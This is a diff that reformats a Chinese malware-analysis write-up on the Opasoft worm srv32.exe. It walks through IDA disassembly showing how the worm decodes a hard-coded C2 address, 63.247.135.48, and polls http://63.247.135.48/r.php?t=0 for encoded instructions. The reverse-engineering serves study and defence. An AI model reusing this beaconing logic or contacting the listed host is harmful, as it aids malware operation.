@@ -1,390 +1,549 @@
 
-
 # 蠕虫 srv32.exe 逆向分析笔记 3 -- 幕后通讯篇
 
-> 原文：[`www.pediy.com/kssd/pediy07/pediy7-156.htm`](https://www.pediy.com/kssd/pediy07/pediy7-156.htm)
+> 原文：[www.pediy.com/kssd/pediy07/pediy7-156.htm](https://www.pediy.com/kssd/pediy07/pediy7-156.htm)
 
-文件名称：srv32.exe  
-蠕虫名称：Net-Worm.Win32.Opasoft.s  
-工具：   IDA 4.5.1, SoftICE3.1  
-  
-  
-上次我们说到在函数 sub\_40148D 里创建了一个线程，现在我们看看这个线程到底  
-在作什么。  
-CODE:0040148D sub\_40148D      proc near  
-...  
-CODE:004014AA loc\_4014AA:  
-CODE:004014AA                 push    offset ThreadId ; lpThreadId  
-CODE:004014AF                 push    0               ; dwCreationFlags  
-CODE:004014B1                 push    0               ; lpParameter  
-CODE:004014B3                 push    401DB0h         ; lpStartAddress  
-CODE:004014B8                 push    2000h           ; dwStackSize  
-CODE:004014BD                 push    0               ; lpThreadAttributes  
-CODE:004014BF                 call    CreateThread  
-CODE:004014C4                 mov     ds:hHandle, eax  
-CODE:004014C9   
-CODE:004014C9 locret\_4014C9:  
-CODE:004014C9                 retn  
-CODE:004014C9 sub\_40148D      endp  
-  
-用 IDA 查看该线程的代码如下：  
-  
-CODE:00401DB0 ; DWORD \_\_stdcall StartAddress(LPVOID)  
-CODE:00401DB0 StartAddress    proc near  
-CODE:00401DB0   
-CODE:00401DB0 dwConnectedState= dword ptr -0A68h  
-CODE:00401DB0 var\_A64         = dword ptr -0A64h  
-CODE:00401DB0 var\_A60         = dword ptr -0A60h  
-CODE:00401DB0 var\_A5C         = dword ptr -0A5Ch  
-CODE:00401DB0 var\_A58         = dword ptr -0A58h  
-CODE:00401DB0 NumberOfBytesWritten= dword ptr -0A54h  
-CODE:00401DB0 lpBuffer        = dword ptr -0A4Ch  
-CODE:00401DB0 hInternet       = dword ptr -0A48h  
-CODE:00401DB0 var\_A44         = dword ptr -0A44h  
-CODE:00401DB0 pszUrl          = dword ptr -944h  
-CODE:00401DB0 Buffer          = dword ptr -844h  
-CODE:00401DB0 var\_840         = dword ptr -840h  
-CODE:00401DB0 var\_83C         = dword ptr -83Ch  
-CODE:00401DB0 var\_838         = dword ptr -838h  
-CODE:00401DB0 var\_834         = dword ptr -834h  
-CODE:00401DB0 var\_830         = dword ptr -830h  
-CODE:00401DB0 var\_82C         = dword ptr -82Ch  
-CODE:00401DB0 var\_828         = dword ptr -828h  
-CODE:00401DB0 var\_81C         = dword ptr -81Ch  
-CODE:00401DB0 var\_814         = dword ptr -814h  
-CODE:00401DB0 var\_810         = dword ptr -810h  
-CODE:00401DB0 var\_10          = dword ptr -10h  
-CODE:00401DB0 var\_C           = dword ptr -0Ch  
-CODE:00401DB0 hMem            = dword ptr -8  
-CODE:00401DB0 pBufOfReadFile  = dword ptr -4  
-CODE:00401DB0   
-CODE:00401DB0                 enter   0A68h, 0  
-CODE:00401DB4                 mov     \[ebp+pBufOfReadFile\], 0  
-CODE:00401DBB   
-CODE:00401DBB loc\_401DBB:  
-CODE:00401DBB                 lea     eax, \[ebp+dwConnectedState\]  
-CODE:00401DC1                 push    0  
-CODE:00401DC3                 push    eax             ; lpdwFlags  
-CODE:00401DC4                 call    InternetGetConnectedState ; 获得本地网络连接状态  
-CODE:00401DC9                 test    eax, eax  
-CODE:00401DCB                 jnz     short loc\_401DD9  
-CODE:00401DCD   
-CODE:00401DCD loc\_401DCD:  
-CODE:00401DCD                 push    2710h           ; dwMilliseconds  
-CODE:00401DD2                 call    Sleep  
-CODE:00401DD7                 jmp     short loc\_401DBB ; 睡 10 秒再工作  
-CODE:00401DD9 ; ///////////////////////////////////////////////////////////////////////////  
-  
-  
-可以看到该线程一开始就调用 InternetGetConnectedState 来判断当前的网络连接状态，  
-没有连接就休息 10 秒再试，有连接就跳转到以下代码：  
-  
-CODE:00401DD9 loc\_401DD9:    
-CODE:00401DD9                 push    0  
-CODE:00401DDB                 push    0  
-CODE:00401DDD                 push    0  
-CODE:00401DDF                 push    0               ; INTERNET\_OPEN\_TYPE\_PRECONFIG  
-CODE:00401DE1                 push    0  
-CODE:00401DE3                 call    InternetOpenA   ; 初始化工作  
-CODE:00401DE8                 mov     \[ebp+hInternet\], eax  
-CODE:00401DEE                 push    10000h          ; 65536 Bytes  
-CODE:00401DF3                 push    0               ; uFlags = LMEM\_FIXED  
-CODE:00401DF5                 call    LocalAlloc      ; 分配内存  
-CODE:00401DFA                 mov     \[ebp+lpBuffer\], eax  
-CODE:00401E00                 lea     eax, \[ebp+pBufOfReadFile\]  
-CODE:00401E03                 push    eax  
-CODE:00401E04                 call    sub\_401A39      ; 对文件 hstlst 操作  
-CODE:00401E09                 test    eax, eax  
-CODE:00401E0B                 jz      short loc\_401E29  
-  
-  
-InternetOpenA 为调用 WinInet.dll 里的函数做一些准备工作，sub\_401A39 会  
-读 Windows 目录下文件 hstlst 的内容，并对读出的内容进行转换（pBufOfReadFile   
-指向地址就是转换后的内容的地址），第一次执行并没有这个文件，也没有跳转，其实看  
-名字也能猜到文件 hstlst 可能是一段 IP 地址（HostList 嘛:)），其实文件 hstlst 不存  
-在的话在函数 sub\_401A39 会用到一段数据如下：  
-  
-g\_IpAddr\_40600C\[\] =  
-{  
-  0xDF,0x11,0xD2,0xEE,  
-  0x45,0xC6,0xFA,0xFA,  
-  0xB2,0xBA,0xF0,0x67,  
-  0x39,0x74,0x88,0xEE,  
-  0x25,0xB1,0xD0,0x39,  
-  0x87,0x1A,0x0C,0x55,  
-  0x11,0x65,0xA7,0xDE,  
-  0xA4,0x4F,0xDA,0x10  
-}  
-  
-这段数据经过函数 sub\_401967 转换成：  
-  
-pBufOfReadFile\[\] =  
-{  
-  0xE8,0xFE,0x0C,0x00,  
-  0xF0,0x06,0x1E,0x00,  
-  0x42,0xF6,0x29,0xC9,  
-  0x3F,0xF7,0x87,0x30,  
-  0x3F,0xF7,0x87,0x30,  
-  0x40,0xB1,0xE2,0xC0,  
-  0x00,0x00,0x00,0x00,  
-  0x00,0x00,0x00,0x00  
-}  
-  
-一会会用到 DWORD pBufOfReadFile\[0xC\] 就是 0x3F,0xF7,0x87,0x30  
-到下面你就会发现它是一段 IP 地址,0x3087F73F = 3F.F7.87.30=63.247.135.48  
-  
-继续走...  
-  
-CODE:00401E0D                 mov     edi, \[ebp+pBufOfReadFile\]  
-CODE:00401E10                 mov     ecx, eax  
-CODE:00401E12                 shr     ecx, 2  
-CODE:00401E15                 xor     eax, eax  
-CODE:00401E17                 cld  
-CODE:00401E18                 repne scasd  
-CODE:00401E1A                 sub     edi, \[ebp+pBufOfReadFile\]  
-CODE:00401E1D                 shr     edi, 2  
-CODE:00401E20                 dec     edi  
-CODE:00401E21                 mov     \[ebp+var\_C\], edi  
-CODE:00401E24                 cmp     edi, 5  
-CODE:00401E27                 jge     short loc\_401E2B  ;程序到这里会跳转  
-  
-CODE:00401E29 loc\_401E29:   
-CODE:00401E29                 jmp     short loc\_401DCD  
-CODE:00401E2B ; ///////////////////////////////////////////////////////////////////////////  
-CODE:00401E2B   
-CODE:00401E2B loc\_401E2B:   
-CODE:00401E2B                 mov     \[ebp+var\_A64\], 0  
-CODE:00401E35                 push    0               ; hTemplateFile  
-CODE:00401E37                 push    0               ; dwFlagsAndAttributes  
-CODE:00401E39                 push    3               ; OPEN\_EXISTING  
-CODE:00401E3B                 push    0               ; lpSecurityAttributes  
-CODE:00401E3D                 push    3               ; dwShareMode  
-CODE:00401E3F                 push    80000000h       ; dwDesiredAccess  
-CODE:00401E44                 push    offset aSccss   ; lpFileName  
-CODE:00401E49                 call    CreateFileA  
-CODE:00401E4E                 cmp     eax, 0FFFFFFFFh  
-CODE:00401E51                 jz      loc\_401F91      ; 文件 sccss 不存在跳  
-  
-噢，又用到了 sccss 文件，没有跳走...  
-  
-CODE:00401F9B loc\_401F9B:   
-CODE:00401F9B                 mov     \[ebp+var\_10\], 0  
-CODE:00401FA2                 push    0               ; hTemplateFile  
-CODE:00401FA4                 push    0               ; dwFlagsAndAttributes  
-CODE:00401FA6                 push    3               ; OPEN\_EXISTING  
-CODE:00401FA8                 push    0               ; lpSecurityAttributes  
-CODE:00401FAA                 push    3               ; dwShareMode  
-CODE:00401FAC                 push    80000000h       ; dwDesiredAccess  
-CODE:00401FB1                 push    offset aSrv32res ; lpFileName  
-CODE:00401FB6                 call    CreateFileA     ; 打开文件 srv32res  
-CODE:00401FBB                 cmp     eax, 0FFFFFFFFh  
-CODE:00401FBE                 jnz     short loc\_401FD0 ; 打开文件 srv32res 成功则跳转  
-CODE:00401FC0                 cmp     ds:dword\_406587, 0  
-CODE:00401FC7                 jnz     short loc\_401FCB  
-CODE:00401FC9                 jmp     short loc\_402034  
-  
-哈哈，还记得第一篇吗，就是这两个文件 sccss，srv32res，这次 jmp 到了 402034  
-  
-CODE:00402034 loc\_402034:   
-CODE:00402034                 lea     eax, \[ebp+pszUrlParam\]  
-CODE:0040203A                 push    offset aT0      ; "t=0"  
-CODE:0040203F                 push    eax  
-CODE:00402040                 call    lstrcpy         ; 把字符串"t=0"拷贝到 var\_A44  
-CODE:00402045                 jmp     short $+2       ; 到 loc\_402047  
-CODE:00402047   
-CODE:00402047 loc\_402047:    
-CODE:00402047                 mov     eax, \[ebp+pBufOfReadFile\]  
-CODE:0040204A                 push    dword ptr \[eax+0Ch\] ; in  
-CODE:0040204D                 call    inet\_ntoa       ; 把 IP 地址转换成字符格式 x.x.x.x  
-CODE:0040204D                                         ; 第一次到这时为 63.247.135.48  
-CODE:00402052                 lea     edi, \[ebp+pszUrl\]  
-CODE:00402058                 lea     ecx, \[ebp+pszUrlParam\]  
-CODE:0040205E                 push    ecx             ; string "t=0"  
-CODE:0040205F                 push    eax             ; Ip Address:63.247.135.48  
-CODE:00402060                 push    offset aHttpSR\_php?S ; "http://%s/r.php?%s"  
-CODE:00402065                 push    edi  
-CODE:00402066                 call    wsprintfA       ; 函数执行完后  
-CODE:00402066                                         ; pszUrl == \*(edi)  
-CODE:00402066                                         ; = http://63.247.135.48/r.php?t=0  
-CODE:0040206B                 add     esp, 10h        ; \_\_cdecl 调用，由调用函数平衡堆栈  
-CODE:0040206E                 lea     eax, \[ebp+NumberOfBytesWritten\]  
-  
-  
-看这两句  
-mov eax,\[ebp+pBufOfReadFile\]  
-push dword ptr \[eax+0ch\]  
-  
-那个 push 的就是(DWORD) pBufOfReadFile\[0xC\]，然后调用 inet\_ntoa 把 IP 地址转换  
-成了点分十进制的字符形式，最后得到了 URL：http://63.247.135.48/r.php?t=0  
-  
-CODE:00402074                 push    eax  
-CODE:00402075                 push    \[ebp+lpBuffer\]  
-CODE:0040207B                 push    edi             ; 把 URL 入栈  
-CODE:0040207C                 push    \[ebp+hInternet\]  
-CODE:00402082                 call    sub\_401CF0  
-  
-URL 入栈后调用了 sub\_401CF0，跟进去看看它搞什么鬼..  
-  
-CODE:00401CF0 sub\_401CF0      proc near  
-CODE:00401CF0   
-CODE:00401CF0 dwNumberOfByteRead= dword ptr -110h  
-CODE:00401CF0 hUrlFile        = dword ptr -10Ch  
-CODE:00401CF0 dwInfoBufSize   = dword ptr -108h  
-CODE:00401CF0 lpszInfoBuf     = dword ptr -104h  
-CODE:00401CF0 var\_dwReturnValue= dword ptr -4  
-CODE:00401CF0 arg\_hInternet   = dword ptr  8  
-CODE:00401CF0 arg\_URL         = dword ptr  0Ch  
-CODE:00401CF0 arg\_lpszReadBuf = dword ptr  10h  
-CODE:00401CF0 arg\_pdwUrlFileSize= dword ptr  14h  
-CODE:00401CF0            ;为了方便理解我已经把这个函数的参数和局部变量重新命了名  
-CODE:00401CF0                 enter   110h, 0  
-CODE:00401CF4                 push    esi  
-CODE:00401CF5                 mov     \[ebp+var\_dwReturnValue\], 0  
-CODE:00401CFC                 push    0               ; dwContext  
-CODE:00401CFE                 push    4000100h        ; dwFlags ==  
-CODE:00401CFE                                         ; INTERNET\_FLAG\_RAW\_DATA |  
-CODE:00401CFE                                         ; INTERNET\_FLAG\_PRAGMA\_NOCACHE  
-CODE:00401D03                 push    0               ; dwHeadersLength  
-CODE:00401D05                 push    0               ; lpszHeaders  
-CODE:00401D07                 push    \[ebp+arg\_URL\]   ; lpszURL == http://63.247.135.48/r.php?t=0  
-CODE:00401D0A                 push    \[ebp+arg\_hInternet\] ; hInternet  
-CODE:00401D0D                 call    InternetOpenUrlA  
-CODE:00401D12                 test    eax, eax  
-CODE:00401D14                 jz      loc\_401DA8      ; InternetOpenUrlA 失败则跳转  
-  
-调用 InternetOpenUrlA 打开上面得到的那个 URL：http://63.246.135.48/r.php?t=0  
-  
-CODE:00401D1A                 mov     \[ebp+hUrlFile\], eax  
-CODE:00401D20                 mov     \[ebp+dwInfoBufSize\], 100h  
-CODE:00401D2A                 lea     eax, \[ebp+lpszInfoBuf\]  
-CODE:00401D30                 lea     edx, \[ebp+dwInfoBufSize\]  
-CODE:00401D36                 push    0  
-CODE:00401D38                 push    edx  
-CODE:00401D39                 push    eax  
-CODE:00401D3A                 push    13h  
-CODE:00401D3C                 push    \[ebp+hUrlFile\]  
-CODE:00401D42                 call    HttpQueryInfoA  ; 返回的信息串为"200"  
-CODE:00401D42                                         ; 表示 http 请求成功,返回信息存储到 lpszInfoBuf  
-CODE:00401D47                 test    eax, eax  
-CODE:00401D49                 jz      short loc\_401D9D ; 函数 HttpQueryInfo 失败则跳转  
-  
-调用 HttpQueryInfo 来判断 HTTP 服务器 63.246.135.48 是否正常响应，返回值为 200  
-表示 http 请求成功，下面就会调用 InternetReadFile 去读文件。  
-  
-CODE:00401D4B                 mov     esi, \[ebp+arg\_pdwUrlFileSize\]  
-CODE:00401D4E                 mov     dword ptr \[esi\], 0  
-CODE:00401D54   
-CODE:00401D54 loc\_401D54:  
-CODE:00401D54                 mov     eax, \[ebp+arg\_lpszReadBuf\]  
-CODE:00401D57                 add     eax, \[esi\]  
-CODE:00401D59                 mov     ecx, 10000h  
-CODE:00401D5E                 sub     ecx, \[esi\]  
-CODE:00401D60                 lea     edx, \[ebp+dwNumberOfByteRead\]  
-CODE:00401D66                 push    edx  
-CODE:00401D67                 push    ecx  
-CODE:00401D68                 push    eax  
-CODE:00401D69                 push    \[ebp+hUrlFile\]  
-CODE:00401D6F                 call    InternetReadFile  
-CODE:00401D74                 test    eax, eax  
-CODE:00401D76                 jz      short loc\_401D86 ; 失败则跳转  
-  
-读 r.php?t=0 返回的内容，存到 arg\_lpszReadBuf(这是个指针参数，用于向上层函数返回  
-读取的内容)，读的字节数存到 dwNumberOfByteRead，读出的内容为：  
-  
-arg\_lpszReadBuf\[\] = "\\  
-t=8&p=1525FFFFFFFFFFFF&c=D0A58993CE0F2086053F57E8785F90C61B1F8E  
-20DB856D9554CC789EC0F28D7162D43FC75E50069F8793C546B88A9C4BD80D2  
-9241357C766626A77D951CD57CFF9794E84507F478A47EC525DAA963D70172A  
-D7CCC3348F3B06B598EA9A286187733F576EB82A6D43CACF4F56746595C01A6  
-005215EA0E0BE6D9896C25B5A9252F1949A0E964CC86EE6EA5B00F15AE9B386  
-15CC7594BD85B3318FDC8D905D4D5ED93AD43F211A008F6C0D0FDF702F21BA7  
-3349F58AA2F78F7FE0750D8C0D019846F4B63B1D5FD699F62A0D5471FC9A69B  
-643B20BE7A819679A89868C58723FDA8C0B503329C6B345C3D35FFA9DABC868  
-0BE5A90BBB8D9EE4C963619F1949EC6F8DF24E6DFC6E38CB7FB024D59E80358  
-08C6B054DEA68B0F8F05302C027DBC14A149C72F9F907AB3D909EDEF3085C9B  
-57A36D64DA14C23071AB5715BDEDDC6195D558D1310842BB33D180FF103EFF9  
-CF931D58E0BE5000095351DCE2D48000EAF73E84D1DD92A3B0C0CFA73179613  
-628E9A63E89DAB3A3C64D3573141C2D17A55064F988361669A4D0B9DAD6886E  
-5F32BFB2C40A7DFC8BF1457A512475D1E32B3799AF025547444C19CCE8B62BD  
-26EA0AF2350E421DB48EDAE22CF696946928788DD05FE044848E3FD61792192  
-DD6D2424DF48BC501E8200EE6AFEFF50C3B5488BAD36892C2763BCC6E7AB30C  
-F789426A745FD65B0C8ECE543EA0D6606D2220DEBE1D1E3D42C97FE5216BE06  
-A7B07DB2145491990A8AD977055A7540049AB776445ABC1F83FFF41247CD8AE  
-C388ECDBF562A1C9B2F850992A5AE4179915E63811D9BD958FA135E69F16B73  
-4E9FD4679FED9464E6EA753AFB5BB411F3AF28A7347F7B49C5A05C776AE1F9F  
-0FBDA29252FBF21F3F73CF888B599F0E6927B48725FA7C6A9871178EEAF6E42  
-BF0694A62838BDB2240DAE97F654A37F14872675A34CAA068A552AB3F53BCBB  
-4DD890E4788120AA3319EBE6BA4E98612EB93252D794C6BECB3464F48242F44  
-3B3EF0E077C15961E5406B821A626F755483A3FFA7A5E451E4CE96E149A0FBD  
-D&v=FEE9&d=0&w=&k=124F5"  
-  
-字符串的最后这一段"&v=FEE9&d=0&w=&k=124F5",每次请求可能会不一样。  
-  
-CODE:00401D78                 mov     eax, \[ebp+dwNumberOfByteRead\]  
-CODE:00401D7E                 test    eax, eax  
-CODE:00401D80                 jz      short loc\_401D8F  
-CODE:00401D82                 add     \[esi\], eax  
-CODE:00401D84                 jmp     short loc\_401D54  
-CODE:00401D86 ; ///////////////////////////////////////////////////////////////////////////  
-CODE:00401D86   
-CODE:00401D86 loc\_401D86:  
-CODE:00401D86                 mov     \[ebp+var\_dwReturnValue\], 0FFFFFFFFh  
-CODE:00401D8D                 jmp     short loc\_401D9D  
-CODE:00401D8F ; ///////////////////////////////////////////////////////////////////////////  
-CODE:00401D8F   
-CODE:00401D8F loc\_401D8F:    
-CODE:00401D8F                 lea     eax, \[ebp+lpszInfoBuf\]  
-CODE:00401D95                 call    sub\_4018D7      ; 把 Internet 返回的字符串"200"  
-CODE:00401D95                                         ; 转换成数字 200(0xC8)  
-  
-子函数 sub\_4018D7 把 Http 请求返回的信息转换成数字 200（十六进制 0xC8）,并作为函数的返回值返回。  
-  
-CODE:00401D9A                 mov     \[ebp+var\_dwReturnValue\], eax  
-CODE:00401D9D   
-  
-CODE:00401D9D loc\_401D9D:   
-CODE:00401D9D                 push    \[ebp+hUrlFile\]  
-CODE:00401DA3                 call    InternetCloseHandle  
-CODE:00401DA8   
-CODE:00401DA8 loc\_401DA8:   
-CODE:00401DA8                 mov     eax, \[ebp+var\_dwReturnValue\] ; 函数最后返回值 200(0xC8)  
-CODE:00401DAB                 pop     esi  
-CODE:00401DAC                 leave  
-CODE:00401DAD                 retn    10h  
-CODE:00401DAD sub\_401CF0      endp  
-  
+文件名称：`srv32.exe`
+
+蠕虫名称：`Net-Worm.Win32.Opasoft.s`
+
+工具： `IDA` 4.5.1, `SoftICE` 3.1
+
+上次我们说到在函数 `sub_40148D` 里创建了一个线程，现在我们看看这个线程到底在作什么。
+
+```
+CODE:0040148D sub_40148D     proc near
+...
+CODE:004014AA loc_4014AA:
+CODE:004014AA                 push    offset ThreadId ; lpThreadId
+CODE:004014AF                 push    0              ; dwCreationFlags
+CODE:004014B1                 push    0              ; lpParameter
+CODE:004014B3                 push    401DB0h        ; lpStartAddress
+CODE:004014B8                 push    2000h          ; dwStackSize
+CODE:004014BD                 push    0              ; lpThreadAttributes
+CODE:004014BF                 call    CreateThread
+CODE:004014C4                 mov     ds:hHandle, eax
+CODE:004014C9
+CODE:004014C9 locret_4014C9:
+CODE:004014C9                 retn
+CODE:004014C9 sub_40148D     endp
+```
+
+用 `IDA` 查看该线程的代码如下：
+
+```
+CODE:00401DB0 ; DWORD __stdcall StartAddress(LPVOID)
+CODE:00401DB0 StartAddress    proc near
+CODE:00401DB0
+CODE:00401DB0 dwConnectedState= dword ptr -0A68h
+CODE:00401DB0 var_A64         = dword ptr -0A64h
+CODE:00401DB0 var_A60         = dword ptr -0A60h
+CODE:00401DB0 var_A5C         = dword ptr -0A5Ch
+CODE:00401DB0 var_A58         = dword ptr -0A58h
+CODE:00401DB0 NumberOfBytesWritten= dword ptr -0A54h
+CODE:00401DB0 lpBuffer        = dword ptr -0A4Ch
+CODE:00401DB0 hInternet       = dword ptr -0A48h
+CODE:00401DB0 var_A44         = dword ptr -0A44h
+CODE:00401DB0 pszUrl          = dword ptr -944h
+CODE:00401DB0 Buffer          = dword ptr -844h
+CODE:00401DB0 var_840         = dword ptr -840h
+CODE:00401DB0 var_83C         = dword ptr -83Ch
+CODE:00401DB0 var_838         = dword ptr -838h
+CODE:00401DB0 var_834         = dword ptr -834h
+CODE:00401DB0 var_830         = dword ptr -830h
+CODE:00401DB0 var_82C         = dword ptr -82Ch
+CODE:00401DB0 var_828         = dword ptr -828h
+CODE:00401DB0 var_81C         = dword ptr -81Ch
+CODE:00401DB0 var_814         = dword ptr -814h
+CODE:00401DB0 var_810         = dword ptr -810h
+CODE:00401DB0 var_10          = dword ptr -10h
+CODE:00401DB0 var_C           = dword ptr -0Ch
+CODE:00401DB0 hMem            = dword ptr -8
+CODE:00401DB0 pBufOfReadFile  = dword ptr -4
+CODE:00401DB0
+CODE:00401DB0                 enter   0A68h, 0
+CODE:00401DB4                 mov     [ebp+pBufOfReadFile], 0
+CODE:00401DBB
+CODE:00401DBB loc_401DBB:
+CODE:00401DBB                 lea     eax, [ebp+dwConnectedState]
+CODE:00401DC1                 push    0
+CODE:00401DC3                 push    eax         ; lpdwFlags
+CODE:00401DC4                 call    InternetGetConnectedState ; 获得本地网络连接状态
+CODE:00401DC9                 test    eax, eax
+CODE:00401DCB                 jnz     short loc_401DD9
+CODE:00401DCD
+CODE:00401DCD loc_401DCD:
+CODE:00401DCD                 push    2710h       ; dwMilliseconds
+CODE:00401DD2                 call    Sleep
+CODE:00401DD7                 jmp     short loc_401DBB ; 睡 10 秒再工作
+CODE:00401DD9 ; ///////////////////////////////////////////////////////////////////////
+```
+
+可以看到该线程一开始就调用 `InternetGetConnectedState` 来判断当前的网络连接状态，没有连接就休息 10 秒再试，有连接就跳转到以下代码：
+
+```
+CODE:00401DD9 loc_401DD9:
+CODE:00401DD9                 push    0
+CODE:00401DDB                 push    0
+CODE:00401DDD                 push    0
+CODE:00401DDF                 push    0           ; INTERNET_OPEN_TYPE_PRECONFIG
+CODE:00401DE1                 push    0
+CODE:00401DE3                 call    InternetOpenA   ; 初始化工作
+CODE:00401DE8                 mov     [ebp+hInternet], eax
+CODE:00401DEE                 push    10000h      ; 65536 Bytes
+CODE:00401DF3                 push    0           ; uFlags = LMEM_FIXED
+CODE:00401DF5                 call    LocalAlloc      ; 分配内存
+CODE:00401DFA                 mov     [ebp+lpBuffer], eax
+CODE:00401E00                 lea     eax, [ebp+pBufOfReadFile]
+CODE:00401E03                 push    eax
+CODE:00401E04                 call    sub_401A39      ; 对文件 hstlst 操作
+CODE:00401E09                 test    eax, eax
+CODE:00401E0B                 jz      short loc_401E29
+```
+
+`InternetOpenA` 为调用 `WinInet.dll` 里的函数做一些准备工作，`sub_401A39` 会读 `Windows` 目录下文件 `hstlst` 的内容，并对读出的内容进行转换（`pBufOfReadFile` 指向地址就是转换后的内容的地址），第一次执行并没有这个文件，也没有跳转。其实看名字也能猜到文件 `hstlst` 可能是一段 IP 地址（HostList 嘛:)）。其实文件 `hstlst` 不存在的话，在函数 `sub_401A39` 会用到一段数据如下：
+
+```
+g_IpAddr_40600C[] =
+{
+  0xDF,0x11,0xD2,0xEE,
+  0x45,0xC6,0xFA,0xFA,
+  0xB2,0xBA,0xF0,0x67,
+  0x39,0x74,0x88,0xEE,
+  0x25,0xB1,0xD0,0x39,
+  0x87,0x1A,0x0C,0x55,
+  0x11,0x65,0xA7,0xDE,
+  0xA4,0x4F,0xDA,0x10
+}
+```
+
+这段数据经过函数 `sub_401967` 转换成：
+
+```
+pBufOfReadFile[] =
+{
+  0xE8,0xFE,0x0C,0x00,
+  0xF0,0x06,0x1E,0x00,
+  0x42,0xF6,0x29,0xC9,
+  0x3F,0xF7,0x87,0x30,
+  0x3F,0xF7,0x87,0x30,
+  0x40,0xB1,0xE2,0xC0,
+  0x00,0x00,0x00,0x00,
+  0x00,0x00,0x00,0x00
+}
+```
+
+一会会用到 `DWORD pBufOfReadFile[0xC]` 就是 `0x3F,0xF7,0x87,0x30`。到下面你就会发现它是一段 IP 地址，`0x3087F73F = 3F.F7.87.30 = 63.247.135.48`。
+
+继续走...
+
+```
+CODE:00401E0D                 mov     edi, [ebp+pBufOfReadFile]
+CODE:00401E10                 mov     ecx, eax
+CODE:00401E12                 shr     ecx, 2
+CODE:00401E15                 xor     eax, eax
+CODE:00401E17                 cld
+CODE:00401E18                 repne scasd
+CODE:00401E1A                 sub     edi, [ebp+pBufOfReadFile]
+CODE:00401E1D                 shr     edi, 2
+CODE:00401E20                 dec     edi
+CODE:00401E21                 mov     [ebp+var_C], edi
+CODE:00401E24                 cmp     edi, 5
+CODE:00401E27                 jge     short loc_401E2B  ; 程序到这里会跳转
+CODE:00401E29 loc_401E29:
+CODE:00401E29                 jmp     short loc_401DCD
+CODE:00401E2B ; ///////////////////////////////////////////////////////////////////////
+CODE:00401E2B
+CODE:00401E2B loc_401E2B:
+CODE:00401E2B                 mov     [ebp+var_A64], 0
+CODE:00401E35                 push    0           ; hTemplateFile
+CODE:00401E37                 push    0           ; dwFlagsAndAttributes
+CODE:00401E39                 push    3           ; OPEN_EXISTING
+CODE:00401E3B                 push    0           ; lpSecurityAttributes
+CODE:00401E3D                 push    3           ; dwShareMode
+CODE:00401E3F                 push    80000000h   ; dwDesiredAccess
+CODE:00401E44                 push    offset asccss   ; lpFileName
+CODE:00401E49                 call    CreateFileA
+CODE:00401E4E                 cmp     eax, 0FFFFFFFFh
+CODE:00401E51                 jz      loc_401F91      ; 文件 sccss 不存在跳
+```
+
+噢，又用到了 `sccss` 文件，没有跳走...
+
+```
+CODE:00401F9B loc_401F9B:
+CODE:00401F9B                 mov     [ebp+var_10], 0
+CODE:00401FA2                 push    0           ; hTemplateFile
+CODE:00401FA4                 push    0           ; dwFlagsAndAttributes
+CODE:00401FA6                 push    3           ; OPEN_EXISTING
+CODE:00401FA8                 push    0           ; lpSecurityAttributes
+CODE:00401FAA                 push    3           ; dwShareMode
+CODE:00401FAC                 push    80000000h   ; dwDesiredAccess
+CODE:00401FB1                 push    offset asrv32res ; lpFileName
+CODE:00401FB6                 call    CreateFileA     ; 打开文件 srv32res
+CODE:00401FBB                 cmp     eax, 0FFFFFFFFh
+CODE:00401FBE                 jnz     short loc_401FD0 ; 打开文件 srv32res 成功则跳转
+CODE:00401FC0                 cmp     ds:dword_406587, 0
+CODE:00401FC7                 jnz     short loc_401FCB
+```
+
+
+
+### 1. 准备字符串 `t=0` 并跳转
+
+```asm
+CODE:00401FC9    jmp     short loc_402034
+```
+
+哈哈，还记得第一篇吗，就是这两个文件`sccss`，`srv32res`，这次`jmp`到了`402034`。
+
+### 2. 设置 URL 参数并获取 IP 地址
+
+```asm
+CODE:00402034 loc_402034:
+
+CODE:00402034             lea     eax, [ebp+pszUrlParam]
+
+CODE:0040203A             push    offset aT0     ; "t=0"
+
+CODE:0040203F             push    eax
+
+CODE:00402040             call    lstrcpy          ; 把字符串"t=0"拷贝到 var_A44
+
+CODE:00402045             jmp     short $+2      ; 到 loc_402047
+
+CODE:00402047
+
+CODE:00402047 loc_402047:
+
+CODE:00402047             mov     eax, [ebp+pBufOfReadFile]
+
+CODE:0040204A             push    dword ptr [eax+0Ch] ; in
+
+CODE:0040204D             call    inet_ntoa      ; 把 IP 地址转换成字符格式 x.x.x.x
+
+CODE:0040204D                         ; 第一次到这时为 63.247.135.48
+
+CODE:00402052             lea     edi, [ebp+pszUrl]
+
+CODE:00402058             lea     ecx, [ebp+pszUrlParam]
+
+CODE:0040205E             push    ecx        ; string "t=0"
+
+CODE:0040205F             push    eax        ; Ip Address:63.247.135.48
+
+CODE:00402060             push    offset aHttpSR_php?S ; "http://%s/r.php?%s"
+
+CODE:00402065             push    edi
+
+CODE:00402066             call    wsprintfA      ; 函数执行完后
+
+CODE:00402066                         ; pszUrl == *(edi)
+
+CODE:00402066                         ; = http://63.247.135.48/r.php?t=0
+
+CODE:0040206B             add     esp, 10h     ; __cdecl 调用，由调用函数平衡堆栈
+
+CODE:0040206E             lea     eax, [ebp+NumberOfBytesWritten]
+```
+
+看这两句：
+
+```asm
+mov eax,[ebp+pBufOfReadFile]
+
+push dword ptr [eax+0ch]
+```
+
+那个`push`的就是`(DWORD) pBufOfReadFile[0xC]`，然后调用`inet_ntoa`把IP地址转换成了点分十进制的字符形式，最后得到了URL：`http://63.247.135.48/r.php?t=0`。
+
+### 3. 构造 URL 并调用子程序
+
+```asm
+CODE:00402074             push    eax
+
+CODE:00402075             push    [ebp+lpBuffer]
+
+CODE:0040207B             push    edi        ; 把 URL 入栈
+
+CODE:0040207C             push    [ebp+hInternet]
+
+CODE:00402082             call    sub_401CF0
+```
+
+URL入栈后调用了`sub_401CF0`，跟进去看看它搞什么鬼..
+
+```asm
+CODE:00401CF0 sub_401CF0    proc near
+
+CODE:00401CF0
+
+CODE:00401CF0 dwNumberOfByteRead= dword ptr -110h
+
+CODE:00401CF0 hUrlFile        = dword ptr -10Ch
+
+CODE:00401CF0 dwInfoBufSize   = dword ptr -108h
+
+CODE:00401CF0 lpszInfoBuf     = dword ptr -104h
+
+CODE:00401CF0 var_dwReturnValue= dword ptr -4
+
+CODE:00401CF0 arg_hInternet   = dword ptr 8
+
+CODE:00401CF0 arg_URL         = dword ptr 0Ch
+
+CODE:00401CF0 arg_lpszReadBuf = dword ptr 10h
+
+CODE:00401CF0 arg_pdwUrlFileSize= dword ptr 14h
+
